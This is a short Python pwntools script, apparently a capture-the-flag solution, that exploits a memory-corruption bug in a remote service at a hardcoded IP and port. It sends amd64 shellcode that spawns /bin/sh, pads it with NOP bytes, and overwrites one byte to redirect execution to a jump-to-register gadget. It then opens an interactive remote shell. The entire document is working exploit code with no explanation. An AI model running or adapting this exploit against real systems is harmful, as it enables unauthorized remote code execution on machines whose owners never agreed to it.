from pwn import *
context.log_level="debug"
context.arch="amd64"
# sh=process("./pwn")
sh=remote("39.106.48.123",33789)
jmprbx=0x2A
payload=asm("sub rsp, 0x50")+asm(shellcraft.sh())
payload=payload.ljust(0x38,b'\x90')+b'\x2a'
# gdb.attach(sh,"b *$rebase(0x8D2)\nc")
sh.sendafter(b"Do u know what's is it?\n",payload)
sh.interactive()